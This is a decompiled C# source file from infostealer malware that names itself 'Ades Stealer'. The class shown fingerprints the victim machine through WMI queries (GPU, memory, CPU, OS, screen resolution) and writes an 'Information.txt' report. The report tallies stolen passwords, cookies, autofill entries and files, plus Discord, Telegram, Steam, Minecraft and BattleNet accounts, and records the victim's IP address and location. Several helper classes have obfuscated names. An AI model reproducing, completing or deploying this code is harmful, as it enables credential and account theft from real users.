using System;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;

namespace Stealer;

internal class pcinfo
{
	private enum ProcessDPIAwareness
	{
		ProcessDPIUnaware,
		ProcessSystemDPIAware,
		ProcessPerMonitorDPIAware
	}

	public static string GpuName()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						text = text + ((ManagementBaseObject)val2).get_Item("Description").ToString() + " ";
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return (!string.IsNullOrEmpty(text)) ? text : "N/A";
		}
		catch
		{
			return "None";
		}
	}

	public static string GetPhysicalMemory()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_0016: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementScope val = new ManagementScope();
			ObjectQuery val2 = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
			ManagementObjectCollection obj = new ManagementObjectSearcher(val, val2).Get();
			long num = 0L;
			ManagementObjectEnumerator enumerator = obj.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					long num2 = Convert.ToInt64(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Capacity"));
					num += num2;
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return (num / 1024L / 1024L).ToString();
		}
		catch
		{
			return "None";
		}
	}

	public static string ProcessorId()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectCollection instances = new ManagementClass("SELECT * FROM Win32_Processor").GetInstances();
			string result = string.Empty;
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					result = (string)((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("ProcessorId");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return "None";
		}
	}

	public static string GetOSInformation()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.get_Current();
				try
				{
					return ((string)((ManagementBaseObject)val).get_Item("Caption")).Trim() + ", " + (string)((ManagementBaseObject)val).get_Item("Version") + ", " + (string)((ManagementBaseObject)val).get_Item("OSArchitecture");
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return "BIOS Maker: None";
	}

	public static string GetComputerName()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
			string result = string.Empty;
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					result = (string)((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return "None";
		}
	}

	public static string GetProcessorName()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
			string result = string.Empty;
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					result = (string)((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return "None";
		}
	}

	[STAThread]
	public static void get()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		try
		{
			SetDpiAwareness();
			ComputerInfo val = new ComputerInfo();
			string text = Screen.get_PrimaryScreen().get_Bounds().Width + "x" + Screen.get_PrimaryScreen().get_Bounds().Height;
			string text2 = "";
			text2 += "             _              _____ _             _           \r\n    /\\      | |            / ____| |           | |          \r\n   /  \\   __| | ___  ___  | (___ | |_ ___  __ _| | ___ _ __ \r\n  / /\\ \\ / _` |/ _ \\/ __|  \\___ \\| __/ _ \\/ _` | |/ _ \\ '__|\r\n / ____ \\ (_| |  __/\\__ \\  ____) | ||  __/ (_| | |  __/ |   \r\n/_/    \\_\\__,_|\\___||___/ |_____/ \\__\\___|\\__,_|_|\\___|_|   \r\n                      ______                                \r\n                     |______|       by @chaykaok (telegram)\n\n";
			text2 = text2 + $"| Операционная система: {Environment.OSVersion} | {val.get_OSFullName()}" + "\n| Название пк: " + Environment.MachineName + "\n| Разрешение: " + text + "\n| Оперативная память: " + GetPhysicalMemory() + "\n\n| Discord: " + ((DiscordGrab.count > 0) ? $"+ ({DiscordGrab.profiles})" : "-") + "\n| Telegram: " + ((TGrab.count > 0) ? "+" : "-") + "\n| Steam: " + ((SteamGrab.count > 0) ? $"+ ({SteamGrab.profiles})" : "-") + "\n| Mine: " + ((MinecraftGrab.count > 0) ? $"+ ({MinecraftGrab.accounts})" : "-") + "\n\n" + $"| Паролей: {HPCDmXNsRephme.count}" + "\n" + $"| Печенья: {tBBjEnntmoNlKq.count}" + "\n" + $"| Заполнений: {QLevflljZWQAqd.count}" + "\n" + $"| Файлов: {FileGrabber.count}" + "\n\n| Времени заняло: " + cDFkBrvXKxXwYB.elapsedTime + "\n| Путь: " + Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName + "\n" + $"| Дата: {DateTime.Now}" + "\n\n| Айпи: " + cDFkBrvXKxXwYB.ip() + "\n| Город: " + cDFkBrvXKxXwYB.City() + "\n| Страна: " + cDFkBrvXKxXwYB.Country() + "\n\n-----Итоги-----\n| Passwords:   " + cDFkBrvXKxXwYB.elapsedPasswords + "\n| Cookies:     " + cDFkBrvXKxXwYB.elapsedCookies + "\n| FileGrabber: " + cDFkBrvXKxXwYB.elapsedFile + "\n| Steam:       " + cDFkBrvXKxXwYB.elapsedSteam + "\n| AutoFill:    " + cDFkBrvXKxXwYB.elapsedAutofills + "\n| Discord:     " + cDFkBrvXKxXwYB.elapsedDiscord + "\n| Telegram:    " + cDFkBrvXKxXwYB.elapsedTG + "\n| Minecraft:   " + cDFkBrvXKxXwYB.elapsedMinecraft + "\n| BattleNet:   " + cDFkBrvXKxXwYB.elapsedBattle;
			File.WriteAllText(Help.path_stealer + "Information.txt", text2);
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
		}
	}

	[DllImport("shcore.dll")]
	private static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);

	private static void SetDpiAwareness()
	{
		try
		{
			if (Environment.OSVersion.Version.Major >= 6)
			{
				SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
			}
		}
		catch (EntryPointNotFoundException)
		{
		}
	}
}
